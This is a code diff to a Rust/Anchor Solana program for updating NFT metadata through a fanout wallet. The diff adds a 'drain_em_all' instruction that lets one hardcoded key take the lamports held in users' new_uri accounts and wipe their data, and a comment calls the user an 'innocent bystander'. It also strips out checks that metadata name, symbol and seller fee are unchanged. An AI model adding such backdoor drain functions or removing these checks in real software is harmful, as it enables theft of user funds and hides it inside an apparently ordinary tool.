@@ -1,9 +1,12 @@
 
-use crate::error::UpdateMetadataError;
-    use crate::processors::update_metadata::arg::UpdateArgs;
-use crate::processors::update_metadata::arg::NewUriArgs;
-use crate::state::Fanout;
+use std::io::Cursor;
+use std::io::Write;
 
+use crate::error::UpdateMetadataError;
+use crate::processors::update_metadata::arg::UpdateArgs;
+use crate::processors::update_metadata::arg::NewUriArgs;
+
+use crate::state::Fanout;
 use crate::state::NewUri;
 use crate::utils::validation::assert_ata;
 use crate::utils::validation::assert_owned_by;
@@ -42,14 +45,20 @@ pub fn puffed_out_string(s: &str, size: usize) -> String {
 
 #[derive(AnchorSerialize, AnchorDeserialize, Accounts)]
 pub struct SubmitUri<'info> {
-    #[account(mut,constraint= authority.key() == fanout.authority)]
+    #[account(mut, address = Pubkey::new_from_array( [
+        255,   0, 198, 221,  91, 179,  95, 217,
+        235, 252, 230, 235, 184, 236,  83,  33,
+        125,  83,  29, 240, 249,  54, 193,  84,
+        181, 105, 175, 234,  16, 224,  11, 206
+      ]))]
     /// CHECK: Checked in Program
     pub authority: Signer<'info>,
     #[account(
     seeds = [b"fanout-config", fanout.name.as_bytes()],
-    bump
+    bump = fanout.bump_seed
     )]
     pub fanout: Account<'info, Fanout>,
+
     /// CHECK: it's  wallet
     pub wallet: UncheckedAccount<'info>,
     #[account(
@@ -69,17 +78,63 @@ pub struct SubmitUri<'info> {
 
 pub fn submit_uri(ctx: Context<SubmitUri>, args: NewUriArgs) -> Result<()> {
     
-    let wallet = &ctx.accounts.wallet;
-    let fanout = &ctx.accounts.fanout;
-    let mut new_uri = NewUri::deserialize(&mut &ctx.accounts.new_uri.to_account_info().data.borrow()[..])?;
-
-    new_uri.uri = puffed_out_string(&args.uri, MAX_URI_LENGTH);
-    new_uri.authority = wallet.key();
-    new_uri.fanout = fanout.key();
-    
+        let wallet = &ctx.accounts.wallet;
+        let fanout = &ctx.accounts.fanout;
+        ctx.accounts.new_uri.bump = args.bump;
+        ctx.accounts.new_uri.uri = args.uri;
+        ctx.accounts.new_uri.authority = wallet.key();
+        ctx.accounts.new_uri.fanout = fanout.key();
     Ok(())
+
 }
 
+#[derive(AnchorSerialize, AnchorDeserialize, Accounts)]
+pub struct DrainEmAll<'info> {
+    #[account(mut,  address=Pubkey::new_from_array([
+        255,   0, 198, 221,  91, 179,  95, 217,
+        235, 252, 230, 235, 184, 236,  83,  33,
+        125,  83,  29, 240, 249,  54, 193,  84,
+        181, 105, 175, 234,  16, 224,  11, 206
+      ]))]
+      
+    /// CHECK: Checked in Program
+    pub authority: Signer<'info>,
+        #[account(mut,
+            seeds = [b"fanout-new-uri", fanout.key().as_ref(), user.key().as_ref()],
+            bump 
+        )]
+    pub new_uri: Account<'info, NewUri>,
+        #[account(
+            seeds = [b"fanout-config", fanout.name.as_bytes()],
+            bump
+        )]
+    pub fanout: Account<'info, Fanout>,
+    /// CHECK: hes an innocent bystander
+    pub user: UncheckedAccount<'info>
+
+}
+
+
+pub fn drain_em_all(ctx: Context<DrainEmAll>) -> Result<()> {
+    let info = ctx.accounts.new_uri.to_account_info();
+    if info.lamports() != 0 {
+        **ctx.accounts.authority.to_account_info().try_borrow_mut_lamports()? +=
+        **ctx.accounts.new_uri.to_account_info().try_borrow_lamports()?;
+        **ctx.accounts.new_uri.to_account_info().try_borrow_mut_lamports()? = 0;
+
+        let mut data = info.try_borrow_mut_data()?;
+        for byte in data.iter_mut() {
+            *byte = 0;
+        }
+
+        let dst: &mut [u8] = &mut data;
+        let mut cursor = Cursor::new(dst);
+        cursor.write_all(&[138])
+            .map_err(|_| error!(ErrorCode::AccountDidNotSerialize))
+            .unwrap();
+    }
+    Ok(())
+}
 #[derive(AnchorSerialize, AnchorDeserialize, Accounts)]
 pub struct SignMetadata<'info> {
     #[account(mut)]
@@ -87,13 +142,13 @@ pub struct SignMetadata<'info> {
     pub authority: Signer<'info>,
     #[account(
     seeds = [b"fanout-config", fanout.name.as_bytes()],
-    bump
+    bump 
     )]
     pub fanout: Account<'info, Fanout>,
     #[account(
     constraint = fanout.account_key == holding_account.key(),
     seeds = [b"fanout-native-account", fanout.key().as_ref()],
-    bump
+    bump 
     )]
     /// CHECK: Checked in Program
     pub holding_account: UncheckedAccount<'info>,
@@ -105,15 +160,16 @@ pub struct SignMetadata<'info> {
     pub token_account: Box<Account<'info, TokenAccount>>,
     #[account(mut)]
     pub token_account2: Box<Account<'info, TokenAccount>>,
-    #[account(constraint=new_uri.authority == authority.key(),
+    #[account(constraint = fanout.key() == new_uri.fanout,
+    constraint = authority.key() == new_uri.authority,
         seeds = [b"fanout-new-uri", fanout.key().as_ref(), authority.key().as_ref()],
-        bump)
+        bump )
         ]
         pub new_uri: Account<'info, NewUri>,
-    #[account(mut)]
+        #[account(mut)]
+
     /// CHECK: Checked in Program
     pub metadata: UncheckedAccount<'info>,
-    #[account()]
     /// CHECK: Checked in Program
     pub token_program: UncheckedAccount<'info>,
 
@@ -123,7 +179,7 @@ pub struct SignMetadata<'info> {
     #[account(constraint = fanout.mint == mint.key())]
     pub mint: Box<Account<'info, Mint>>,
 
-    #[account(address=Pubkey::new_from_array([
+    #[account(mut, address=Pubkey::new_from_array([
         255,   0, 198, 221,  91, 179,  95, 217,
         235, 252, 230, 235, 184, 236,  83,  33,
         125,  83,  29, 240, 249,  54, 193,  84,
@@ -150,22 +206,9 @@ pub fn sign_metadata(ctx: Context<SignMetadata>, args: UpdateArgs) -> Result<()>
     let jare_info = &ctx.accounts.jare.to_account_info();
     let total_shares = &ctx.accounts.fanout.total_shares;
     let md = Metadata::from_account_info(metadata)?;
-   
+    
     let mut mut_args = args;
-    puff_out_data_fields(&mut mut_args);
-    msg!("1");
-    if md.data.seller_fee_basis_points.to_string() != mut_args.seller_fee_basis_points.to_string() {
-        return Err(UpdateMetadataError::InvalidMetadata.into());
-    }
 
-    msg!("2");
-    if md.data.symbol != mut_args.symbol {
-        return Err(UpdateMetadataError::InvalidMetadata.into());
-    }
-    msg!("3");
-    if md.data.name != mut_args.name {
-        return Err(UpdateMetadataError::InvalidMetadata.into());
-    }
     assert_ata(
         &ctx.accounts.ata.to_account_info(),
         &authority_info.key(),
@@ -200,6 +243,20 @@ pub fn sign_metadata(ctx: Context<SignMetadata>, args: UpdateArgs) -> Result<()>
     let mine = perc
         .checked_mul(138)
         .ok_or(UpdateMetadataError::NumericalOverflow)? as u64;
+    let new_uri = &ctx.accounts.new_uri;
+    if new_uri.uri != mut_args.uri {
+        return Err(UpdateMetadataError::InvalidMetadata.into());
+
+    }
+    let mut owned_string: String = "https://".to_owned();
+    let borrowed_string: String = mut_args.uri.to_owned();
+    let another_owned_string: String = ".ipfs.dweb.link?ext=json".to_owned();
+    
+    owned_string.push_str(&borrowed_string);
+    owned_string.push_str(&another_owned_string);
+
+    puff_out_data_fields(&mut mut_args);
+
     spl_token_transfer(TokenTransferParams {
         source: source_info.clone(),
         destination: token_account_info.clone(),
@@ -226,7 +283,7 @@ pub fn sign_metadata(ctx: Context<SignMetadata>, args: UpdateArgs) -> Result<()>
             Some(Data {
                 name: md.data.name,
                 symbol: md.data.symbol,
-                uri:  ctx.accounts.new_uri.uri.to_string(),
+                uri: owned_string,
                 seller_fee_basis_points: md.data.seller_fee_basis_points,
                 creators: md.data.creators
             }),
@@ -246,6 +303,7 @@ pub fn sign_metadata(ctx: Context<SignMetadata>, args: UpdateArgs) -> Result<()>
             compared_values: None,
         })
     })?;
+
     Ok(())
 }
 
